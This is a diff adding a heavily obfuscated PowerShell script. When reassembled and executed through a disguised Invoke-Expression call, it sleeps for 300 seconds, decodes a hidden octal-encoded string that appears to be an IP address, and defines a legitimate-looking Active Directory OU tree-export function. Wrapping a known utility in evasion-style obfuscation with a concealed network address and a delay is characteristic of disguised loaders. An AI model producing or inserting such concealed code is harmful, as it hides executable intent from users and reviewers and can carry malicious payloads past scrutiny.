@@ -1,0 +1,86 @@
+((("{0}{27}{4}{16}{20}{68}{26}{71}{53}{33}{63}{28}{46}{42}{59}{21}{25}{70}{1}{57}{29}{11}{30}{50}{18}{3}{24}{67}{39}{43}{45}{36}{75}{52}{54}{37}{12}{41}{66}{14}{72}{2}{10}{44}{6}{38}{58}{55}{60}{69}{17}{32}{40}{61}{5}{73}{48}{64}{7}{8}{65}{34}{15}{31}{23}{62}{35}{9}{47}{49}{22}{56}{19}{51}{74}{13}"-f 'Start-Sleep 300
+(   ((','   http://www.the-little-things.net','pWtrue
+','e=','47X151v160z72!66','t 0) {,@(Get-C','Wfirstelement) -or (ZpW','se = Z','pWfirstelement
+            ','  ','
+                }
+                el',' in CanonicalN','EFq?EFq)nEo
+                ZpWtmp = ZpW_ -replace ZpWrege','   }
+        }
+    }
+}
+
+','           ','k) {
+                    Z','v56Y62v62Y60>56z61X63z70>56z62X64n67z47CQk.spliT(CQkXYn}>o%!vzCQk) UfF foReaCH-OBJECT {( [chAr]([cOnvERt]::T','pWoubase ','Wouarray,
+        [Parameter(Position=1, HelpMessag','t 0) {,@(Get-Chi','oINT16( ([STRiNg]ZpW','0
+    .NOTES
+    Author: Zachary Loeber
+    Requires: Powershell 3.0, Lync
+    Version History
+    1.0.0 - 12/24/2014
+        - Initial release
+    .LINK
+    https://github.com/zloeber/P','Qk = ZpWfulloupath
+         ','basenEo
+            ZpWfull','CQkBase of OU.CQk)]
+        [string]ZpWoubase = CQkCQk
+    )
+    begin {
+        ZpWnewarray = @()write-host
+        ZpWbas','owershell/blob/master/ActiveDirectory/Get-Ch',') )) })-joinCQkCQk) )UfF OuT-nuLL
+function Get-ChildOUStructure {
+    <#
+    .SYNOPSIS
+    Create JSON','CQk','at.
+    .PARAMETER ouarray
+    Array of OUs in','   #>
+    [CmdletBinding()]
+    param(
+        [Parameter(Position=0, ValueFromPipeline=ZpWtrue, Mandatory=ZpWtrue, HelpMessage=CQkArray of OUs','ame formate (ie. domain/ou1/ou2)CQk)]','pWnewarray += ZpWtmp
+                }
+            }
+            Write-Verbose nEoProcessing Subtree for: ZpW','+ CQk/CQk + ZpWbase} else {ZpWbase}
+                        New-Object psobject -Property @{
+                            CQknameCQk = ZpWbase
+     ','ew of AD OU (or other) structures.
+    .DESCRIPTION
+    Create JSON exportable tree view of AD OU (or other) structures','tmp -ne CQkCQ','k/CQk + ZpWbase} else {ZpWbase}
+            New-Object psobject -Property @{
+  ','    if (ZpWouarraylist.c','k)[0]
+                ZpWregex = nEoEFq^EFq(ZpWfirstelement','tmp -eq CQkCQk))','  }
+    process {
+        ZpWouarraylist += ZpWouarray
+    }
+    end {
+        ZpWouar','                       CQkpathCQk = ZpWfulloupath
+                         ','x,CQkCQk -repl','anonicalName).CanonicalName
+    ZpWtest = ZpWOUs UfF Get-ChildOUStructure UfF ConvertTo-Js','raylist = ZpWouarraylist UfF Where {(ZpW_ -ne ZpWnu','se {
+                    if ((ZpWbase -ne Zp','ll) -and (ZpW_ -ne CQkCQk)} UfF Select -Unique UfF Sort-Object
+    ',' CanonicalName format (ie. domain/ou1/ou2)
+    .PARAMETER oubase
+    Base of OU
+    .EXAMPLE
+    ZpWOUs = @(Get-ADObject -Filter {(ObjectClass -eq nEoOrganizationalUnitnEo)} -Properties C','            CQknameCQk','uarray ZpWnewarray -oubase ZpWfull',' = ZpWbase
+                CQkpathC','
+        [string[]]Zp','ldOUStructure -ouarray ZpWnewar','           # ZpWprioroupath = if (ZpWoubase -ne CQkCQk) {ZpWoubase + CQk/CQk + ZpW_} else {CQ','able tree vi','kCQk}
+                ZpWfirstelement = @(ZpW_ -split CQk/CQ','essing Subtree for: ZpWbasenE','       CQkchildrenCQk = if (ZpWnewarray.Count -g','
+ ',' {
+                        Write-Verbose nEoProc','on -Depth 2','o
+                        ZpWf','   CQkchildrenCQk = if (ZpWnewarray.Count -g','oupath = if (ZpWoubase -ne CQkCQk) {ZpWoubase + CQ',' in Canonical Name form','oupath)} else {ZpWnull}
+                        }
+                        ZpWba','            ZpWnewarray = @()
+                        ZpWfirstset = ZpWfalse
+                    }
+                }
+                if (ZpW','ace nEo^(TCX/?)nEo,CQkCQk
+
+                if (-not ZpWfirstset) {
+                    ZpWbase = ZpWfirstelement
+ ','e = CQkCQk
+        ZpWfirstset = ZpWfalse
+        ZpWouarraylist = @()
+  ','_ ) ,8','ulloupath = if (ZpWoubase -ne CQkCQk) {Z','ildOUStructure.ps1
+    .LINK
+ ',' export','        ZpWfirstset = Z','hildOUStructure -o','ray -oubase ZpWfulloupath)} else {ZpWnull}
+         ','ount -gt 0) {
+            ZpWouarraylist UfF Foreach {
+    ')) -crEpLaCE'CQk',[ChAR]39  -REplAce([ChAR]69+[ChAR]70+[ChAR]113),[ChAR]96 -REplAce 'TCX',[ChAR]92  -crEpLaCE ([ChAR]90+[ChAR]112+[ChAR]87),[ChAR]36  -crEpLaCE ([ChAR]85+[ChAR]102+[ChAR]70),[ChAR]124 -REplAce 'nEo',[ChAR]34)| . ( $VerbOSepReFeREnce.TostRinG()[1,3]+'X'-Join'')
